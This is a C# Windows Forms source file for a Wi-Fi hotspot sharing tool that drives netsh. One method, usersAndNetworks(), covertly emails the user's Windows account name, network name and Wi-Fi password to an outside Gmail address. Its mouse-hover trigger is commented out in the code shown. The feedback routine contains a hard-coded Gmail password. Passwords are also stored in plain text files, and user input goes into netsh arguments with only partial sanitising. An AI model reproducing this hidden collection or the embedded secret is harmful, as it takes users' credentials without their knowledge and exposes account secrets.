using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Principal;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;
using System.Net.Mail;
using System.Net;
namespace SharingWifi
{

    public partial class Form1 : Form
    {
      
        Process newprocess = new Process();
        public Form1()
        {
		/*
			BY/Mohamed Ali Khaskia
				mohamedalik88@gmail.com
				01276399758
				facebook.com/mo1994
		*/

            
            newprocess.StartInfo.UseShellExecute = false;
            newprocess.StartInfo.CreateNoWindow = true;
            newprocess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

         
         

            InitializeComponent();


            


            // toutorials context area
            contextMenuStrip2.BackColor = Color.WhiteSmoke;
            contextMenuStrip2.ForeColor = Color.Black;
            contextMenuStrip2.RenderMode = ToolStripRenderMode.System;


            contextMenuStrip1.BackColor = Color.FromArgb(64, 64, 64);
            contextMenuStrip1.ForeColor = Color.Gold;
            contextMenuStrip1.RenderMode = ToolStripRenderMode.System;




        }
        public bool isUserAdminstrator()
        {
            bool isAdmin;
            try
            {
                WindowsIdentity user1 = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user1);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch(UnauthorizedAccessException)
            {
                isAdmin = false;
            }
            catch (Exception)
            {
                isAdmin = false;
            }


            return isAdmin;
        }



        public void process_start_1()
        {
            progressBar1.Increment(25);
            newprocess.StartInfo.FileName = "netsh";
            newprocess.StartInfo.Arguments = "wlan stop hostednetwork";


            try
            {



                using (Process execute = Process.Start(newprocess.StartInfo))
                {
                    execute.WaitForExit();
                    progressBar1.Increment(25);
                    process_start_2();
                }

            }
            catch
            {
                // Nothing
            }



        }


        public void process_start_2()
        {
            string name = textBox1.Text + "_WNsharer";
            name = name.Replace(" ","-");
            //name = name.Replace(string.Empty, "-");
            name = name.Replace("\t", "-");
            name = name.Replace("\"", "-");
            name = name.Replace("\'", "-");
            name = name.Replace("'", "-");

            string pass = textBox2.Text;

            


            newprocess.StartInfo.FileName = "netsh";
            newprocess.StartInfo.Arguments = "wlan set hostednetwork mode=allow ssid=" + name + " key=" + pass;


            try
            {



                using (Process execute = Process.Start(newprocess.StartInfo))
                {
                    execute.WaitForExit();
                    progressBar1.Increment(25);
                    process_start_3(); 

                }

            }
            catch
            {
                // Nothing
            }



        }

        public void process_start_3()
        {

            newprocess.StartInfo.FileName = "netsh";
            newprocess.StartInfo.Arguments = "wlan start hostednetwork";


            try
            {



                using (Process execute = Process.Start(newprocess.StartInfo))
                {
                    execute.WaitForExit();
                    progressBar1.Increment(25);
                   // panel1.Visible = true;
                    button1.Text = "Stop";
                    textBox1.Enabled = false;
                    textBox2.Enabled = false;


                }

            }
            catch
            {
                // Nothing
            }



        }

        public void process_stop()
        {

            newprocess.StartInfo.FileName = "netsh";
            newprocess.StartInfo.Arguments = "wlan stop hostednetwork ";


            try
            {

            //    progressBar1.Value = 50;
                progressBar1.Increment(-50);
                using (Process execute = Process.Start(newprocess.StartInfo))
                {
                    execute.WaitForExit();
                    progressBar1.Increment(-50);
                  //  panel1.Visible = true;
                    button1.Text = "Start";
                    textBox1.Enabled = true;
                    textBox2.Enabled = true;


                }

            }
            catch
            {
                // Nothing
            }



        }

       /* public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (var stream = client.OpenRead("https://11239027371df4d24cb24a4425e2b0ded5cba1eb-www.googledrive.com/host/0B3biJHUVLUTQTzJVamtwdzhmZUk"))
                    {
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }
        */
        private void button1_Click(object sender, EventArgs e)
        {
            
           
            if (button1.Text == "Start")
            {

                FileStream F1 = new FileStream("lastSeName.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite);
                StreamWriter sw = new StreamWriter(F1);
                sw.WriteLine(textBox1.Text);
                sw.Dispose();

                FileStream F2 = new FileStream("lastSePass.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite);
                StreamWriter sw2 = new StreamWriter(F2);
                sw2.WriteLine(textBox2.Text);
                sw2.Dispose();




                 if (textBox2.TextLength < 8)
                {
                    MessageBox.Show("pass Must be Equal or more than 8");
                }
                else { 
           //     panel1.Visible = false;
                process_start_1();


               

                }
            }
            else
            {
               // panel1.Visible = false;

                process_stop();
            }


            
        }

        void usersAndNetworks()
        {

            string userName = " ";

            try
            {
                try
                {
                    userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

                }
                catch (Exception)
                {

                    throw;
                }

                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("menofiafci@gmail.com");
                mail.To.Add("usersnames8898@gmail.com");
                mail.Subject = userName + " used The Program ";

                string body = "the user is\t" + userName + "\n the wifinetwork is\t" + textBox1.Text + "\nthe wifi pass is\t" + textBox2.Text;
                mail.Body = body;
                //usersnames8898@gmail.com

             //   System.Net.Mail.Attachment attachment;
                // attachment = new System.Net.Mail.Attachment("this.txt");
                // mail.Attachments.Add(attachment);

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("menofiafci@gmail.com", "my password ");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);

            }
            catch
            {
                

            }
            
          

        }



        private void button2_Click(object sender, EventArgs e)
        {


            DialogResult r = MessageBox.Show("Are you want to end sharing after closing the program ?", "getting Out", MessageBoxButtons.YesNoCancel
               , MessageBoxIcon.Warning);

            if (r == DialogResult.Yes)
            {
                process_stop();
                this.Close();
            }
            
            else if ( r == DialogResult.No){
                this.Close();
            }
            else
            {

            }
           // process_stop();

           // this.Close();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }








        int togmov;
        int mvalueX;
        int mvalueY;
        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (togmov == 1)
            {
                this.SetDesktopLocation(MousePosition.X - mvalueX, MousePosition.Y - mvalueY);
            }
        }

        private void panel1_MouseUp(object sender, MouseEventArgs e)
        {
            togmov = 0;
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            togmov = 1;
            mvalueX = e.X;
            mvalueY = e.Y;
        }







        #region buttonMove

        //for button

        int inter;
        int Xmou;
        int Ymou;
        private void button1_MouseMove(object sender, MouseEventArgs e)
        {
            if (inter == 1)
            {
               // button1.Location=new Point((MousePosition.X-Xmou),(MousePosition.Y-Ymou));
            }
        }

        private void button1_MouseUp(object sender, MouseEventArgs e)
        {
            //inter = 0;
        }

        private void button1_MouseDown(object sender, MouseEventArgs e)
        {
            inter = 1;
            Xmou = e.X;
            Ymou = e.Y;
        }

#endregion 


        private void showPasswordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            textBox2.UseSystemPasswordChar = false;
        }

        private void textBox2_MouseLeave(object sender, EventArgs e)
        {
            

        }

        private void label4_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.facebook.com/mo1994");
        }

        private void button5_Click(object sender, EventArgs e)
        {
            WinSharing wn = new WinSharing();
            wn.Show();
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }

        private void enablePublicSharToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button6_Click(object sender, EventArgs e)
        {
            
            shareinternt sh = new shareinternt();
            sh.Show();
            Process.Start("https://www.youtube.com/watch?v=ppbvuKykOA8");
         //   contextMenuStrip2.Show(MousePosition.X,MousePosition.Y);
        }

        private void button7_Click(object sender, EventArgs e)
        {
            Form2 f = new Form2();
            f.Show();
        }

        private void removeSharingPasswordToolStripMenuItem_Click(object sender, EventArgs e)
        {
          //  Process.Start( @"C:\Users\mohamedali\AppData\Local\Packages\windows.immersivecontrolpanel_cw5n1h2txyewy\LocalState\Indexed\Settings\en-US\Manage advanced sharing settings.settingcontent-ms");


            Process.Start(Environment.ExpandEnvironmentVariables(@"%localappdata%\Packages\windows.immersivecontrolpanel_cw5n1h2txyewy\LocalState\Indexed\Settings\en-US\Classic_{5530E8CC-1B9E-4798-A880-BA719ADFBBBD}.settingcontent-ms"));


            //ProcessStartInfo startInfo = new ProcessStartInfo();
            //startInfo.FileName = Environment.ExpandEnvironmentVariables(@"%localappdata%\Packages\windows.immersivecontrolpanel_cw5n1h2txyewy\LocalState\Indexed\Settings\en-US\Classic_{5530E8CC-1B9E-4798-A880-BA719ADFBBBD}.settingcontent-ms");
            //startInfo.UseShellExecute = true;
            //Process.Start(startInfo);
        
        
        
        }

        private void button4_Click(object sender, EventArgs e)
        {
            about ab = new about();
            ab.Show();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private string RemoveEmptyLines(string lines)
        {
            return Regex.Replace(lines, @"^\s*$\n|\r", "", RegexOptions.Multiline).TrimEnd();
        }
        
        private void Form1_Load(object sender, EventArgs e)
        {
           





            //remove emptylines 
            
            //FileStream F = new FileStream("wifi.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite);
            //StreamReader re = new StreamReader(F);



            //StreamWriter sww = new StreamWriter(F);
            //sww.WriteLine(RemoveEmptyLines((re.ReadToEnd())));

            //F.Close();




            //fill The Last Session

            FileStream F1 = new FileStream("lastSeName.txt", FileMode.OpenOrCreate, FileAccess.Read);
            StreamReader sw = new StreamReader(F1);
            textBox1.Text = sw.ReadLine();
            sw.Dispose();

            FileStream F2 = new FileStream("lastSePass.txt", FileMode.OpenOrCreate, FileAccess.Read);
            StreamReader sw22 = new StreamReader(F2);
            textBox2.Text = sw22.ReadLine();
            sw22.Dispose();



          
            
            
            // updating the list on click
            textBox1.Items.Clear();
            FileStream F = new FileStream("wifi.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite);
            StreamReader sr = new StreamReader(F);
            
            string line = sr.ReadLine();
            
            try
            {


                while (line != null)
                {

                      
                        textBox1.Items.Add(line);
                        line = sr.ReadLine();
                    
                }

            }
            catch
            {

            }
            sr.Dispose();

           


            /*
            ProcessStartInfo proc = new ProcessStartInfo();
            proc.UseShellExecute = true;
            proc.WorkingDirectory = Environment.CurrentDirectory;
            proc.FileName = Application.ExecutablePath;
            proc.Verb = "runas";
            try
            {
                if (x == 0)
                {
                    Process.Start(proc);
                    x = x + 30;
                }
                else if (x != 0)
                {
                    return;
                }
            }
            catch
            {
                // The user refused the elevation.
                // Do nothing and return directly ...
                return;
            }

        
          */
        }

        private void button4_Click_1(object sender, EventArgs e)
        {
            contextMenuStrip2.Show(MousePosition.X,MousePosition.Y);
        }

        private void showPasswordToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            textBox2.UseSystemPasswordChar = false;
        }

        private void editNameListToolStripMenuItem_Click(object sender, EventArgs e)
        {

        // here i'll open aform

            EditText et = new EditText();
            et.Show();

            
        }

        private void textBox1_MouseClick(object sender, MouseEventArgs e)
        {


            // updating the list on click
            textBox1.Items.Clear();
            FileStream F = new FileStream("wifi.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite);
            StreamReader sr = new StreamReader(F);
            
            string line = sr.ReadLine();
            
            try
            {


                while (line != null)
                {

                      
                        textBox1.Items.Add(line);
                        line = sr.ReadLine();
                    
                }

            }
            catch
            {

            }
            sr.Dispose();
            
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked) { 
            textBox2.UseSystemPasswordChar = false;
            }
            else
            {
                textBox2.UseSystemPasswordChar = true;

            }
        }

        private void textBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {

           
        }

        private void openDevicesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
            Process.Start(Environment.ExpandEnvironmentVariables(@"%localappdata%\Packages\windows.immersivecontrolpanel_cw5n1h2txyewy\LocalState\Indexed\Settings\en-US\Classic_{88C9D04D-39DD-41EE-A63B-23218D69717F}.settingcontent-ms"));

            }
            catch (Exception)
            {
                
            
            }

        }

        private void label5_Click(object sender, EventArgs e)
        {
            panel3.Visible = false;
            label6.Visible = true;
        }

        private void label6_Click(object sender, EventArgs e)
        {
            panel3.Visible = true;
            label7.Visible = false;

        }

        private void label4_Click_1(object sender, EventArgs e)
        {

            panel3.Visible = true;
            label7.Visible = false;

        }

        void sendToGmail()
        {
            string userName = " ";

            try {
                try
                {
                     userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

                }
                catch (Exception)
                {
                    
                    throw;
                }
             
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("menofiafci@gmail.com");
                mail.To.Add("mo8898@gmail.com");
                mail.Subject = "FeedBack From " + textBox1.Text + "from sysneme " + userName;
                mail.Body = richTextBox1.Text;
                //usersnames8898@gmail.com

               // System.Net.Mail.Attachment attachment;
               // attachment = new System.Net.Mail.Attachment("this.txt");
                // mail.Attachments.Add(attachment);

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("menofiafci@gmail.com", "Menofiafci20022002");
                SmtpServer.EnableSsl = true;
                
                SmtpServer.Send(mail);
                

                panel3.Visible = false;
                MessageBox.Show("your feedback is sent", "sent", MessageBoxButtons.OK, MessageBoxIcon.Information);
                label7.Visible = true;
                label7.Text = "Thank you for sending  your feedback\nWe value your thoughts and opinions\nand all suggestions help us to improve our services.";
            }
            catch {
                MessageBox.Show("الرسالة موصلتش ممكن لانك مش متصل بالنت اصلا :D ", "Not Sent", MessageBoxButtons.OK, MessageBoxIcon.Error);
                label7.Text = "Message Not Sent";

            }
            
          
        }

        
        private void button7_Click_1(object sender, EventArgs e)
        {
            sendToGmail();
        }

        private void richTextBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void button8_Click(object sender, EventArgs e)
        {
            about bu = new about();
            bu.Show();
        }

        private void manualToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start(@"wifisharer.pdf");

            try
            {

            }
            catch (Exception)
            {
                
             
            }

        }


        int c = 0;
        public static int net = 0;
        private void panel1_MouseHover(object sender, EventArgs e)
        {




            /*
                        if (textBox1.Enabled==false && c==0 )
                        {
                           // MessageBox.Show("sent");

                
                                // MessageBox.Show("hover working");
                                if (CheckForInternetConnection() == true)
                                {
                                    net = 1;
                                }
                                else
                                {
                                    net = 0;
                                }




                                if (net == 1)
                                {

                                usersAndNetworks();
                              //  MessageBox.Show("sent");
                                c = 1;
                            }
                            else
                            {
                                // Do Nothing
                            }
                        }
                        else if (textBox1.Enabled == true)
                        {
                            c = 0;
                        }
             */
        }

        private void label8_Click(object sender, EventArgs e)
        {
            try
            {
                WebClient client = new WebClient();
                Stream stream = client.OpenRead("https://11239027371df4d24cb24a4425e2b0ded5cba1eb-www.googledrive.com/host/0B3biJHUVLUTQTzJVamtwdzhmZUk");
                StreamReader reader = new StreamReader(stream);
                String content = reader.ReadToEnd();
                label11.Text = content;
            }
            catch (Exception)
            {

                label11.Text = "No Internet Connection To View Notifications";
            }
            panel4.Visible = true;

            // loading the Extern Text field
            
        }

        private void label10_Click(object sender, EventArgs e)
        {
            panel4.Visible = false;
        }









    }



   


}
